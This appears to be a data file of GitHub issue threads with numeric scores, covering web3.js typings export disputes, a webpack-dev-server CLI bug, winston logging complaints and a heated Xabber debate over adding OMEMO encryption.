RenameOnce=yes and otherwise to RenameOnce=no (and 99-default.link would set RenameOnce=yes either way)  @friend Please go talk to Linus Torvalds. If it works today and you make a change to break users, you are in the wrong. I should hope you wouldn't need yelling at to understand that. Software developers need to internalize this and abide by it at all times, life would be much easier.  Please don't post offtopic comments. (This is making rounds elsewhere, locking this for now might be best).  BTW, for those coming late, a good fix (including a revert) has been merged now. I think all should be good now. ",34,5,256,0.1282051282051282,0.20512820512820512,121,12,
ethereum/web3.js/1248,0.056490209,ethereum,web3.js,Web3 typescript definition has no default export,19335,202,77,0.4423076923076923,5,"Hello, Web3 Typescript definition on branch 1.0 doesn't contain ""default export"". After importing ♠import Web3 from 'web3';` I got this issue  Module '""xxxx/node_modules/web3/index""' has no default export.  the type definition reflects the current module implementation line 78 Based on typescript document, it is recommended to adopt module-class, which is why the type is exposed with ""="" and not default. We have been going back and forth on this issue as you can see with #1184, which was exactly to undo the default import that undo the ""="" earlier...  I am sure we don't want to keep repeating this cycle,  will the following import syntax work for you?  Thank you.  Using ""require"" keyword, I got this error on compilation I use typescript  2.6.2  web3.js is still using es5 module system, so it's best to use the compiler option that supports it... try module ""commonjs""  Doing  works for me in version 1.0.0-beta.26 but when i upgrade to 1.0.0-beta.27 I receive the error mentioned in this post. I could use the lower version but i noticed that the method for viewing pass events has changed in .27. IN version .26 the passed events can be viewed by invoking  but in .27 you have to call ; Please resolve soon, thanks  seems like @friend  has a PR for this  here is the bottom line  works for  but breaks  works for  but breaks   If you guys look at the commit history, you can see that we have tried both export styles multiple times because every time you switch to one the other camp complained. Giving the module can't be exported both ""="" and ""default"", we have to choose one... but which one? I think we all agree that the type definition should closely reflect the original package implementation current web3's js implementation uses ""export ="", according to typescript official doc, it is recommended to adopt type definition with ""export ="" (see here). This tips the scale for .  PR1249 made it ""export default"" again in version 1.0.30 . Doesn't work with commonjs anymore.  Just use ES Modules since it's JavaScript's official module system and stop changing it all the time. It's a breaking c  What I ended up doing to stop typescript from complaining and still have type definition and autocompletion is  @friend was able to make it work as follows  From Typescript docs Web3 uses  so the correct way to import it in Typescript is  This should be fixed with the PR #2000 thanks to @friend who is writing the typings!  @friend Which typings are you talking about?  @friend He has currently just implemented the typings for web-utils and there is an open PR for web3-bzz maybe you can help him or move the typings from DefinitelyTyped into the web3.js repository. I would like to have them directly in the repository because this way I can guarantee that they are always up to date. The issue above should be fixed because of the refactoring and the typings Josh is writing but I will proof it before I merge the PR into the 1.0 branch.  I repeatedly said and it is best practice to only have the type definitions at definitely typed. You should never again bring type definitions back into this very code base right here. The only exception for this rule is, if you actually write the code in typescript.  @friend Hey dude, I have to say I completely disagree. I do agree types say quote  - but this would work in a standard  project. At the moment the typing's NEVER get kept in date, someone does a PR in  and you can not force them to do another PR in . This then causes a huge knock effect for all the typescript devs when new versions are released as the types just do not match up. I have had this about 40 times and only finding out the types are incorrect by having to write full unit tests. If it was actually in the repo itself you can enforce contribution instruction to make sure the typing keep in date all the time.  I seen other repos like BigNumber -( do this due to how impossible it was to manage it being in 2 separate repos. At the current time the  are out of sync in the  lib, i have not checked the others but the entire development experience trying to work in  with web3 is too hard at the moment due to the amount of changes. As the main developers work in   is 2nd thought and it should be part of the entire development structure while writing new things in web3 itself. We should also be able to release types + web3.js at the same time at the moment we have to wait for the  PR to be approved which is out of our control. This solution will mean updating methods in the future and updating it's typing will be super easy for all the maintainers as it's in 1 repo. It will also mean the typing's will never be out of sync due to contribution guidelines but still versioned nicely.  I know a lot of people may just use  but as a regular  developer using these library i believe this would be a very good way to start improving this, and a lot of the people i have spoken to about this have agreed. I just trying to make this seamless, bringing easier development for the TypeScript devs that's all. Like i said i can tell you a thousands times where the types reflected are so out of date. This would solve a lot of issues i see raised with typing's and bring it all in with 1 install command. Let me know your thoughts )  Thanks  👍  I removed the type defintions after a long discussion because they were broken (as in ""You were not able to use  in a typescript project without monkey patching the broken type defs, shipped with ) They were broken because there are no automated tests for the type definitions in this repo here. There cannot be. Definitely typed has such tests. I agree that it is a slow process but the process you are suggesting will make things even worse Everyone who is making a contribution to  will have to be a typescript pro from now on. Because as you are saying you will reject every PR without an update to the type defs. At the same time you do not even code the library in typescript! So I have to live with the sadness that I have to write my contributions in JS and then I have to type them by hand afterwards. What a clusterf**k. There are two possible and acceptable ways to proceed  When the API has changed, make a PR to DT fast and live with the fact that sometimes the type defs are outdated for a couple of days. Also stop making big changes to the API. Start writing the code in typescript (which can be done incrementally) and autogenerate the type defiintions.  All other approaches are going to fail and only cause misery.  One other thought to keep in mind This library is written in Javascript, because the people contributing to it are not able to write Typescript code. Now you want them to review type definitions for a usage of this library in Typescript projects. You see the problem?  Thanks for your quick response @friend. I completely understand what you are saying.  So I have to live with the sadness that I have to write my contributions in  and then I have to type them by hand afterwardsJS@friend - I think any  can write standard type definitions with a little bit of support, even if this is fixed by someone who could again i can't see it being a problem. Like i said we don't have loads of regular contributors anyway.  And one more thing PRs to DT get merged pretty quickly when they are good. Most of them aren't though.  This is a false assumption. First you code javascript. Then you code typescript. Then you learn how to produce type definitions. Devs who are able to write type defintions are a subset of the devs who have mastered Typescript, not the other way round. This is an opinion of mine and we reached a point were we have two different opinions and I have not further arguments to give. I made my point. Tipp  @friend but we have under 10 regular contributors.. do you not think this would bring more good then bad? Say yes some  need some support with types but with not many people actually contributing this should not be that hard to maintain. The main advantages it brings are huge over the valid points you have stated. For the over 200k weekly downloads web3 gets I think this could solve a lot of  pains they have. This could be the first step and maybe in the future web3 is rewritten into  but we have to start somewhere. Thanks a lot for your view and taking time to discuss!  I get your argument These 10 contributors should be able to learn typescript. I disagree with your conclusion Lets make them learn typescript and then maintain the type definitions for this JS code base. I think the only conclusion can be Lets make them learn typescript and write everything in typescript. With  you can just rename every file to  and be done. Project is now in typscript.  I think some other milestones have to be reached first before this gets done like actually release of  none beta. I am a big supporter of getting  in  and would happily go through the entire thing and change everything to  but i think that's a bigger discussion to have. Really appreciate your view though!  Cheers Levin 👍  I am not voting to move this here to typescript. I want to show that your idea to maintain the type defs here is a mistake. Publish type definitions with your package iff your is written in typescript. Let others maintain and publish the definitions iff your package is not written in typescript. As this package is not written in typescript (and possibly never will be), it is infeasible to maintain the type defs here. End of story.  And one thing about the argument with BigNumber.js The pain you experienced was not because the type defs where maintained in another repository, but because bignumber.js is not written in typescript.  A popular example of a lib that's not written in TS and maintains its own type defs is Redux - it seems to work fine for them. Redux is way simpler than web3.js, but it also has way more contributors and downloads than web3.js.  That might be. But it is against best practice and I explained in detail why the categorical imperative says it is a bad idea. Only because some people do it does not mean that we have to do it too.  Who defined the best practice you're talking about? One of the most important libs in the industry does it differently without problems, so I don't really see how it's against ""best practice"". TypeScript docs don't discourage such approach either, so I think that it's just your opinion and not a sacred truth that we should follow. I've used web3.js with TypeScript and each time I've written my own typings for things I needed, because the official ones were just plain wrong and not helpful at all. Bigger Ethereum projects like 0x also have picked this route (as seen here) to avoid the hassle of working with official web3 typings from DefinitelyTyped.   With this view we will never ever have solid types for  so  development with it becomes unstable or having to use  everywhere 👎 The likes of Redux do this because of the  it causes relying on others to maintain the types, and as @friend said they have far more contributors and over 2 million downloads a week, we should learn from people who have gone through the pains.   We are in a world where  development is taking over so i thought  would start adopting to supporting in-house types. This would of been a great start. Again i see no reasons that you stated which makes it  bad, in my view the positives overweight the negatives by far. If  do not support  out the box people will have to start using other  which do which i would hate. Anyway discussion over - see ya!  @friend I'd suggest locking this thread to avoid further flamewars.  Please read the docs more carefully. I quote (again and again and again)  @friend not trying to pick sides here, but you must agree that breaking web3.js for typescript users on a regular basis is not a good thing?  Regardless of what the TypeScrypt docs say. For better or worse, a lot of people are using TypeScript that also use web3.js. It sounds to me like the only option here to prevent the regular breakage is to include the ts file in this repo so it's always in sync. If the contributors to this repo don't want to update the types file, let some of the people on this thread help whenever a PR comes in to ensure it gets updated properly before merging, it would probably only take a few minutes of a ""TypeScript pros"" time to check the types file for each PR.  You all want to have typings that are up to date with the current interface of the library, right? Guess what There is only one (just one!) way to achieve this Implement the library in typescript and generate the typings automatically. Even if you maintain the typings here, they will be out of sync all the time. As I said, the typings in this repo were broken. There are several reasons why this cannot work  Pull request reviewers do not understand typescript and cannot review whether or not the changes to the typings are correct. The typings will not be tested. So even if the reviewer is a typescript pro, they are human and will overlook things. (DT tests all typings automatically in CI!!!!) Someone makes a really nice pull request. It gets merged because javascript users want the new feature. Nobody cares for the update to the type definitions because the contributor with the pull request is not able to write them and nobody else comes to the rescue in time.  and 3. is the same for DT, but 3 is not. You will not achieve what you are looking for when you maintain the typings here. Also who of you has made a contribution to DT? It is super easy. There is nothing to fear. The review process is heavliy streamlined and fully automated.   So my point is You all push for maintaining the typings here but you will not achieve what you want to achieve. The type definitions will be out of sync all the time not matter what until this is rewritten in typescript.  Unfortunately in the typescript docs they do not explain why you should publish the typings via DT when you write your package in Javascript, but I think I gave enough reasoning. Additionally to that Why do you think that they recommend that?  I think I do understand TS it is not that rocket science thing to do types. Maybe we could test them in our CI too. This should not happen if I review a PR. I think you should answer this question )  So you will from now on personally review all PRs? That is going to scale well. Yes. That is quite easy. What is more easy though is to rewrite the whole codebase in typescript. It will happen. Or you will drive away open source contributors because they create a valid PR which never gets merged because ""we are still waiting for the typings"". I did explain my thinking. Three times. I repeat myself. People say that I am not right. I want to here their train of thoughts.  And another question for you all What about flow? Should we add flow typings too? Facebook is using flow!  Yes thats what I'm doing currently and will do it as long as I work for this lib. I think we can test them with for example  I have to write the types by my self and I think that will not happen so often. No you didn't you were just quoting the TS documenation but you never really explained the thoughts behind it. The TS documentation does not explain it either. I think I could add for example this  to the publish process to generate them. Idk how good this is but maybe that could be a solution. I'm not saying that I like one of the solutions more then the other but until now I can't see a reall killer argument that we should have them on DT. I think thats more an ethical thing. 😅  Just do what you want if you do not want to listen to reason. This is going to be a fuckup! At least I told you so.  oh and  has their own types and it's a JS project   and  both a ""fuckup""? @friend I have stated valid points here.. you have not really replied to any of them. 👍  I understand your argumentation. You will from now on review every pull request and your super powers will make sure that every change to the API of the library or any of the sub-packages will be reflected 100% in the typings here in the repo. I say You will fail! And you say No I have my superpowers. Which is fine. But I will not waste more time on this. Do it then. It will be painful and hard and you will fail. Lets talk again in a year.  And btw If at some point you decide to rewrite the whole codebase in TS, that does not count as a success, but a fail too, right? Because that is what you want to avoid with your approach.  Ah and I forgot to predict something You will have hundreds of issues from Windows-using script kiddies who cannot use Typescript right but will blame you for ""incorrect typings"". They will all go on the backlog and jam it.  This is already happening @friend , this is what this discussion is all about. Apparently all of us TypeScript users are ""script kiddies"" and yes, we're complaining about this library breaking every time you update it. If you want us ""script kiddies"" to stop complaining, then just do the right thing and fix the problem. You have a bunch of people saying they'll even help fix the problem, which you don't seem to want to accept. 🤦‍♂️  I maintain (with others of course) the  package. If the maintainers of  would drop typescript support, they could just close every typescript related issue and save time and money. And I repeat If you all want that this library supports typescript itself, then JUST WRITE IT IN TYPESCRIPT!  Well, i've been having this page opened for the whole afternoon and i must admit i'm quite amazed by how this has gone to some flames. As JS &amp; TS developper, in normal times, i would have been supporting separated repo for providing types,  as requested by @friend, as i rather prefer avoiding to have any broken type provided by the original repo, third-party packages being easy to remove without touching web3 original code. However, as i read the answers it seems quite technically feasible to ensure types are correctly written before merging any PR, as @friend provided tools &amp; examples of others projects  doing so. Comment from @friend here   also makes me think that rewriting web3 into a TS form might be quite faster as it could be expected. If web3 dev team commits to review type definitions while a typescript migration is being built, i'll definitely support it, they made their point. @friend  i don't think it's about winning or failing here but rather having a collective conversation about how to do it the best way possible. Too bad to have thrown useless flames for that. In any case, and still, thanks for providing . Much datalove  @friend I think people who do this like  and  are doing just fine with this approach. Big repos with millions of downloads a day do this and succeed without  😃 I maintain (with others of course) the @friend/web3 package.tstsjsts` will come 😄. @friend will have a roadmap for this. Thanks for the good discussion though @friend i do respect your views and no hard feelings 👍  If everybody here speaks Typescript then there is no reason not to write this library in Typescript. I repeat again One can incrementally migrate a library to typescript. But that requires some Typescript skills.  I will lock this issue now because I think we already seen all the arguments. Thanks everyone for the effort to be a part of this discussion! ",101,36,472,0.23076923076923078,0.3269230769230769,433,30,
webpack/webpack-dev-server/1220,0.123738945,webpack,webpack-dev-server,WatchOptions passed from command line don't override config,3522,34,18,0.6,3," Operating System  Node Version  NPM Version  webpack Version  webpack-dev-server Version ,  (both)     [x] This is a bug [ ] This is a feature request [ ] This is a modification request  Code Expected Behavior Command line arguments for  should be used Actual Behavior I don't think they are. For Bugs; How can we reproduce the behavior Invoke from CLI as above. Notes Got here from  The code in  would seem to disagree with this assessment.  example for  also works as expected. And the docs don't show the flags as options that you expect to be working. Your  should be in a config. This looks like a classic case of misuse.  @friend is the CLI's  output incorrect or are my expectations incorrect?  Can't speak for most  consumers, but personally i tend to reference  pages and  output 1st and web documentation if I need further explanation. My expectation was that CLI flags take precedence and were reconciled with config somehow. I think myself (and potentially others) are either misinterpreting the  output or perhaps the -related flags indicated from  are inaccurate?  That's a personal choice of course, but I'd highly recommend reading the actual docs next time before submitting an issue for any project. I don't know as if it holds true that  and  are the definitive source of info for modern-day tools outside of some hardcore CLI idealists. None the less, what we have here is a display bug resulting from combining 's CLI configuration with  to get some common config for free. See  that's adding flags from  that  doesn't support. The docs for this module are correct, the output on the CLI is not. We'll track a new issue to see if we can resolve that. But the takeaway here is to always check the actual docs.  I'd neglected to put this in the response above, but want this to stick out for others who might happen across this issue in the future Note the first three lines of the CLI output The important bit there is  as the CLI is pointing users towards the proper docs even in the  output.  @friend Thanks for taking the time to develop a valuable tool and taking the extra effort to document it. What @friend did may not be how you operate, but it is a very common pattern for a huge group of users ""out there""  If you are on a command-line interface, the first thing you do is ""man tool"" or ""tool help"", ""tool -h"", etc. And if the output is too large, the first natural thing to do is grep the output or ""Cmd + F"" Also, properties from the CLI overriding default values or configurations is the common behavior for most CLI tools, it's the ""least surprising behavior""  You are of course free to deviate from the pattern, may I suggest to simply remove the whole output of ""--help"" and replace it with the ""Usage"" link? That would be easier than trying to change people to abandon behaviors that have been proven useful since at least the late 1970's  @friend seriously?  @friend replies of that nature are not helpful and do not contribute to the discussion. please refrain in the future.  @friend let me then elaborate on it so it valuable to the discussion. Keeping documentation in sync with the actual behavior/options of the tool ( be it online or in the tool itself) is fundamental and not something that only ""some hardcore CLI idealists"". It is simply quality of your product. I see you are listed as the 3rd most active contributer on the project and seeing you writing something like that is just bad for the project itself and the JS community in general. This is not idealism is QA! ",12,2,105,0.1,0.3,97,5,
winstonjs/winston/1158,0,winstonjs,winston,Use ES6 promises and better document state callbacks/events,709,11,5,0.75,0,"I'm having a lot of issues testing Winston satisfactorily.  I blame this on the lack of promises used, the atypical style used in the code (readability), and the use of the async file calls/undocumented event emitters. My use cases are very common.  I want to author a test that verifies a log file has been created, and it has been written to.  I've spent literally hours without success figuring out what Winston is doing.  That really is not good. Net effect my perception is that Winston has a lot of bells and whistles (I still don't want to reinvent log rotation), but it's probably contributed to by too many people, its issue log has some serious issues noted, and it fails to implement simple cases. ",0,0,22,0.125,0.125,11,0,
winstonjs/winston/1377,0.0572444115,winstonjs,winston,"V3: New formatters are not equivalent to old formatters, broken logs after migration",3059,34,41,0.375,9,"  Please tell us about your environment   version? [ ]  [x]      outputs v10.4.1 Operating System? macOS High Sierra v10.13.5 Language? ES6  What is the problem?  I've followed the [upgrade to 3.0]( doc, and when I was done, my logs were broken.  V2 supported multiple arguments to log functions, and using common format options, pretty printed Objects/Arrays/Errors nicely.  So these logs worked in V2    &lt;img width=""415"" alt=""screen shot 2018-06-24 at 18 51 16"" src="" width=""499"" alt=""screen shot 2018-06-24 at 18 52 47"" src="" width=""1083"" alt=""screen shot 2018-06-24 at 18 51 47"" src="" in V3, multiple arguments are no longer supported, only  is supported and only as an Object. Plus the equivalent formatters do not yield the same result.    &lt;img width=""551"" alt=""screen shot 2018-06-24 at 19 27 33"" src="" if I add the  formatter, it's still not the same  &lt;img width=""817"" alt=""screen shot 2018-06-24 at 19 28 02"" src="" What do you expect to happen instead?    The migration doc should mention this fundamental change in behavior and how to resolve it Multiple arguments are treated differently Objects as  are not pretty printed Error Object is ignored (I saw there's an open issue for that) Formatters order matters   I think Winston should support the multiple arguments notation, as it is a very common usage of  and really is much easier to use when you need to log a string and then an Object, etc. (specifically when using the Console transport). The new formatters should yield the previous behavior when using the same setup     plus one The documentation is a bit superficial regarding  and the provided examples such as this one do not result in the expected output.  PR would be welcome to update that example @friend. Will take a look at this in depth and see what we can do to make the transition easier.  Also @friend – winston does support the multiple argument notation, it's simply not enabled by default because it is a performance hit and as such opt-in. Use .  @friend I can gladly post a PR but currently I'm unable to understand how to obtain the standard notation. I tried adding  I just get a weird message like the ones shown by @friend.  I was making the same comments (objects/arrays) aren't formatting the same in the Gitter chatroom.  Seems that the previous options.meta isn't treated the same way.  Would be great to understand the differences and how to fix moving forward.  plus one After maybe 2 hours of trying to obtain the same logging format in V3 as in the previous version, I have to say I have to downgrade. I like the custom formatter and format.combine and everything, but either  coloring doesn't work simple format output doesn't work (no JSON) printing out objects (JSON) doesn't work - I don't see any reason why use custom formater with JSON.stringify or combination of the above  I just want logger.error(""error""), logger.info(object), logger.info(array) and no hustle.  All of those features work. If you'd like to share a code sample along with your shade that would be much more constructive. ",9,0,152,0.25,0.375,73,5,
redsolution/xabber-android/540,0.49034846,redsolution,xabber-android,Add support for OMEMO Encyrption,55318,471,415,0.4186046511627907,69,"The offspring of this GSOC XSF projects is OMEMO. An axolotl and PEP based open standard for end-to-end encryption. Would be great to see support for it in Xabber. ProtoXEP  info  Finally, security has arrived in IM without compromise. Please add this protocol! I will switch back from Conversations when it comes.  I'm working on an OMEMO Smack module as part of my bachelors thesis, so Xabber might use this in the future.  yes, please support OMEMO in xabber.  Thanks for all the fish, but the addition of this fish would be more better.  I'm considering to implement OMEMO in Xabber using smack-omemo and smack-omemo-signal. How can I get further in touch with you?  Looks like smack-omemo has been implemented, any progress on it in Xabber?  We have some other more immediate plans. We have 100% confirmation that at least 80-90% of Russian Xabber users use it for buying drugs. And since our crowdfunding campaign goes rather slow,we... Let's say, not too interested into stretching ourselves and give one more encryption method for this cathegory of users. In fact, we are considering removing Xabber from Russian play store at all,we have some very unwanted attention from authorities because of OTR, but to add yet more to it... No. Definitely not now. If patreon campaign will reach certain milestones,maybe.  Can you explain how unwanted attention by authorities is affected by crowdfunding efforts?  @friend why do you provide your own Jabber service, then? If you don't have a central server like xabber.org, it would probably be easier to tell the authorities that you're not the ""information disseminator"" (or how does ""организатор распространения информации"" actually translate to English).  Not good. Time to setup a warrant canary, is not it? Also with this background the crowdfunding campaign will certainly not raise more money. If we have to fear interference of some authorities. Also, you hopefully know that this argumentation is definitively crap. And unless you track your users (which I don't think so) you cannot know what your users are doing with your messenger. So where did you got this number?  @friend that's easy. On one hand we have some difficulties with authorities who vaguely threat they can destroy my business in an instant (it's very easy in russia. police just storms the office, takes away all computers, returns it after 3 years, if ever, end of story). On the other we have an audience of users who constantly moan of a feature I don't personally need at all, and pay me nothing. If we put these two together, a clear solution is to screw Russian audience, I don't really care what client they will use. @friend this argumentation is based on facts. Over the years we have seen just so many help requests on our email support in so many languages, requests in Russian stands out in it by some very unusual metrics rarely present in other groups - phony names and inadequate requests, users clearly have no idea how XMPP works. Plus we've recently launched our own XMPP service that requires users to provide name and surname. And guess what, out of several thousands registrations Russian locale names and surnames once again look very... different from Germans. So, since I have zero sympathy for junkies, and Russian audience is proving to be worthless to me, while giving me some headache. So, I think we'll be removing Xabber from Russian Google Play. And once again on OMEMO so far I'm the only one who paid for development of Xabber, I had some spare money to create an app that I like. I like current Xabber, and I have some plans to redesign it to make it even better looking. I have some plans to create several protocols to make XMPP work much better on mobile devices. I have some plans to bring Xabber for Web to many desktop platforms with Electron framework. I have some plans for all these versions of Xabber to work seamlessly with one another, so you can pick up your conversation on phone after chatting on desktop. That what I want and what I'm paying developers for. What I don't want is OMEMO, it's worthless to me. And since I'm a bit out of spare money, I have to make Xabber a viable source of income, I have some Ideas how to do that, and OMEMO does not play into any of these ideas. If some of you want this feature badly, pay me a for development of it (we charge $3500 per developer man/month). If you are not willing - well, sorry, we serve only customers, not freeriders. I actually don't understand this desire for encryption. Some ejabberd developer recently said in email group that XMPP community is affected by severe crypto-cancer, and I fully agree with him. For most uses, OTR or OMEMO just gives user an illusion of safety, not really meaningful increase in it. If you want your messages to be safe, you can just run your own server, that's easy and rather cheap. Just be wary of certificate errors. TL,DR OMEMO is for junkies and crypto-nerds who pay us nothing, get lost, or pay.  It's sad to hear that you have problems with the authorities. Don't let them oppress you if you didn't do anything wrong. On the other hand there are normal people - who don't use this to deal drugs - who just want their privacy to be protected and also have some convenience. That what's OMEMO is all about.  @friend convenience...  For me, convenience is using multiple devices, syncing history between them, making in searchable, etc. You can have all of that by running own server, that's not too hard or costly. And with OMEMO, once chat is encrypted, you cant' search it, you can't really sync it, etc. - and if you somehow can, then it means that you have an illusion of safety, not better safety. My endgoal for Xabber, is to make XMPP messaging as ubiquitous for instant messaging as email. But to fight Telegram or Whatsapp we need to bring a knife to a knife fight, and OMEMO is hardly that knife. I don't really mind it's addition to Xabber, but, well, someone better pay for it. Btw, OTR was added on precisely same terms - some guy from Moscow volunteered and paid for our initial expenses developing OTR encryption back in 2013 (or 2012? don't remember... ) I prefer to receive payments with bitcoin. Oh, if you ask me, integration to send bitcoin is more essential for Xabber than OMEMO.  How do you come to this conclusion? With OMEMO and Message Carbons (XEP-0280) I can have encrypted chats synced to all my devices and on all devices I can search the chat history just fine.  @friend login from new device and try searching your history like you do on telegram. Client-side search is fail. Anyway, I don't mind you doing a PR with this functionality, we'll test it and accept it in project if it's done well. I don't get it why you all want me to work for free so you can have convenient OMEMO in your device. I don't need or want OMEMO, so I have very little incentive to pay for development of OMEMO. Isn't it fair to be paid by those who actually want it? Anyway you all have free alternatives. Also, message carbons is NOT sufficient to fully sync messages. You at least need to use an archive on server to catch up with those messages sent while you were offline (offline messages will not do if you had 2 devices offline- only one of them will receive offline messages, other will have nothing without archive).  Nothing wrong with that. And I don't want to force your to do anything. Just want to challenge your assumption about OMEMO encryption.  @friend my assumption is that heavy lifting should be done by server (client-centristic mentality has already cost XMPP it's potential place as a mainstream messaging protocol). If server does not know contents of messages, it can't search it. Also, if you store ALL you history on device, instead of small portion of recent messages, well, if your device gets seized, guess what happens? all your history belongs to them, so much for 'security'. Better way would be having a trusted server and having just an immediate portion of your history on device, while accessing more distant history with PIN checked by server. But with this crypto-cancer in community it'll hardly happen anytime soon. (I'd order implementation of server-side search in Xabber in no time, if I had any server available that would support such feature)  Please keep to the facts  Your link about ""crypto cancer"" is about server-to-server SSL connections as far as I see. Also what drives users away according to the comment is spam. (That was taken out of context. Read ""Spam is a bigger problem that missing s2s encryption."" Actually as far as I understand the user replying meant In the XMPP community there is crypto cancer, because many people still do not want to use s2s encrypted messages.) So if you quote stuff, please make sure it fits into what you actually want to prove and don't twist the facts. As far as it goes the topic was not about e2e crypto at all. I feel like you have no (correct) information about OMEMO/how OMEMO works. In short OMEMO is far better than OTR. See this page.. TL;DR In contrast to OTR it actually allows you to use multiple devices, search your messages, send messages when the other is not online, etc. The thread model you describe in the last comment is solved very simple Encrypt your messages locally (i.e. full disk encryption). When the messages are stored on the server and someone gets your device, they can also just instantly download all the old messages. Saving (unencrypted) messages on servers only saves space and makes it easier for authorities to scan messages when they size a server. (Because if you use your own server, they could also size your server instead of your local device.)  TL;DR Only encryption helps. (whether it is FDE on the local device, or server or something like OMEMO)  What I agree with is that people can of course support you, if they want to have a good coverage of OMEMO clients and want this feature. Especially as it is not easy to implement. (You certainly need to find a library for it, as otherwise you can do too much wrong in the crypto.) So anyone who wants this feature, here is a BugBounty Xabber – Add support for OMEMO Encyrption Support it or use another client software, which already has OMEMO support. That are your choices.  @friend facts are  crypto-cancer has taken over all XMPP community, especially users who do not program anything themselves, they just want it for no real reason but their paranoia. It's not only about s2s connections, it's about 'let's encrypt everything'. That link is just one example of this. This thread is another. Dozens of frequent requests 'do us OMEMO' in our email is another. We'd do OMEMO if these requests were based on something more than endless moaning client-side search is fail, I tell you once again.  you do not read what I say above. Search for word PIN and read once more. Yes, server should be updated for such security model. But securing data on device is infinitely harder and less reliable than on server  OTR or OMEMO solves only one security problem - if you don't trust your chat provider, because the only real advantage it gives you over unencrypted messaging is that XMPP.org admin can read your messages. If you have your own server, this risk goes away. Yes, it requires some efforts to maintain server, but you want security or illusion of security? Unlocking your device without your consent is much easier than unlocking server. What is particularly hilarious with this XMPP crypto-cancer is that all these folks who email me about how essential is encryption for messaging usually email me via gmail.com TL;DR please, stop trying to convince us to implement OMEMO. We know what it is. We don't want it for now, because we have limited resources that we prefer to put on things we believe more important for Xabber. If you want us to divert resources it direction you want, we have commercial rates for such work. Thank you for your attention and interest in our project.  FWIW, not really unless you you chat only with people who have a account on the same server. Otherwise you don't know at which servers your messages end up. Also thhe argument ""if someone hacks your device, he has complete access to the chat history"" is also true for the server aka ""if someone hacks your server (or one of your chat partners), he has complete access to the chat history""  @friend prime audience for the use of end to end encryption (drug addicts) are far more likely to have their device seized than their server.  Thank you for the clear words. Then I know now that I don't have to wait for Xabber with OMEMO anymore and stay with Conversations, although I don't want to buy drugs at all. Consistently, you might want to take OTR out so that Xabber becomes useless for junkies and the authorities leave you alone. OTR is certainly also one of the functions for junkies that you don't need personally. After that, you could take care of a nice surface in peace.  @friend you know, every single junkie user I talked to said exactly the same. -D We certainly won't remove OTR functionality from Xabber - most likely we'll simply pull down  Xabber with OTR from Russian Google Play store. Our authorities are luckily not too interested in foreign drug dealers and addicts. Then we'll possibly provide a ""Xabber for Business"" version without encryption for our normal Russian users (all seventeen of them) And I'm not saying we won't ever support OMEMO - it's just not our first, second or third priority. Have you seen Xabber for Web? Creating a multi-platform chat app that works extremely well  for federated chat, everywhere - that's what we are truly aimed at.  The way you talk about your users makes me feel really sorry for you ( It feels like Xabber is really not the app I'd recommend to privacy aware users anymore. Neither because its encryption, nor the will of the devs to protect their users. I respect that decision though and will stop bothering you anymore )  From xabber.com You should probably change that to reflect you actual ""priorities"".  @friend the only privacy-aware users we've encountered so far are junkies, drug dealers and encryption nerds like folks in this thread.  Nerds comprise maybe 1 or 2% of users who are interested in data protection. Any yes, I think you would talk even worse of our users if you did get to read contents of our inbox on support email. And I'm actually offended by your insinuations about our 'will of the devs to protect their users'. Luckily for us, we DON'T have any user data, and we clearly won't submit to installing backdoors or stuff to our app. However you CLEARLY don't understand dangers of such stance in Russia. Linkedin is already blocked in Russia because it refused authorities access to user's data. Facebook will be blocked too if it won't submit. Viber has submitted too, so... it's either you are working in Russia and providing info or being blocked. Company like mine can be instantly seized by armed police, computers taken away, property sealed, company instantly bankrupted, I get jailed. Courts and laws don't really function in Russia, I might very well be sentenced for 'organizing a darknet criminal network to sell drugs and weapons', all because some crypto-nerds want OMEMO. So we simply plan to put our users (even junkies, yes) out of danger to their data being compromised by pulling our app from our country play store. (and to think I've personally spent more than $150k to listen to this.... how cool is that?)  @friend I pity your situation. Maybe just close the ticket and let it rest. The issuer doesn't seem to be interested in this any more. Other security aware users will probably choose different software.  @friend Sorry, I did not intend to offend you. I can imagine that your situation in russia is not the best. I just dislike the way you talk about your users and the fact, that you throw all people interested in crypto into one category labelled ""drug addicts"". This is exactly that kind of rhetoric, which might one day outlaw cryptography completely (""who has nothing to hide...""). Anyways I wish you the best for your future and the future of the project )  @friend no, this ticket might as well remain. Just not top priority for us. We'll probably do it eventually, maybe even this year. Current priority - redesign (Xabber is going to look GREAT), proper push notifications support since ejabbed now supports it, THEN I'll possibly ask our devs to do OMEMO if I won't have more immediate ideas. @friend you too wouldn't like our users if you talked to them. Luckily for us, so far Xabber is popular only within Russian criminal underground, if we measure by inadequate help requests that are 85% in Russian (if you read them often, you can see person interested in drugs at a glance). If you read carefully, I was always referring to our Russian audience, not all encryption users. Well, some folks here who constantly push us to 'do us OMEMO now' irritate me a bit, but that's ok. So the rest of the world will be as fine as it was before, no changes will be made. I'd consider moving Xabber to another jurisdiction, but that's a matter of money. Maybe even transferring rights to FSF, though I don't know if they are interested in this.  Don't want to get too much offtopic, but does the FSF host Android applications? I only know of IceCat mobile... Excited to see the new Xabber design )  Good idea. 👍 But I see it like @friend does. I think all users, who commented on this issue here are interested in having a private mesenger. I doubt that anyone here is a drug dealer. Your equation ""cares for privacy = drug dealer"" does not make sense, even if the authorities maybe urge you to think that. And as said, your statistics are not good (help requests are not a good sign to measure your whole user base; many people may not need any help) and you take numbers out of nowhere. I see that your situation is difficult and developing such a secure messenger is… well… maybe even dangerous. I seriously feel sorry for that. However, that does not change the fact that you – as a dev of an important FLOSS app – care for the privacy/security of your users, who you don't know (for the same reason; don't think you know them because some dumba**es mail you). You can say, we cannot do this for legal reasons, we need to move the company (etc.) to another country or similar things. That's okay and we all understand that, but your inner motivation is questionable from your statements you do here. And throwing false facts into the discussion does not help either…   Thank you @friend for your open words and the time to answer here all these questions! I really appreciate that (Even if not anybody agrees with you on certain statements.)  Summary of that thread to avoid further confusion   Will there be soon or ever OTR support in Xabber by the core devs? Unsure. Why? Because it's not very high on their priority list. They focus on features they personally need/use or other things they are more interessted in. Nothing wrong with that imho, especially when their own money is involved. Is there a way to give it more priority? Yes!  stated, they are also happy to receive PRs for that.  Everybody who wants to get started with that might want to take a look at this blogpost )  @friend Unsure. You mean OMEMO, right? OTR was in Xabber for ages  Talking about OTR (Why) Does it make a difference to you whether drug dealers encrypt with OTR or OMEMO? That does hardly matter… (So consequently you'd either have to remove OTR or may add OMEMO.)  We don't plan to remove OTR until we have something to replace it with. We might remove Xabber from russian users, so hopefully they'll switch to some other app and feds will stop being interested in us. And OMEMO just requires some work that we aren't really willing to do at this moment, since it'll likely just increase pressure on us.  Yes. I 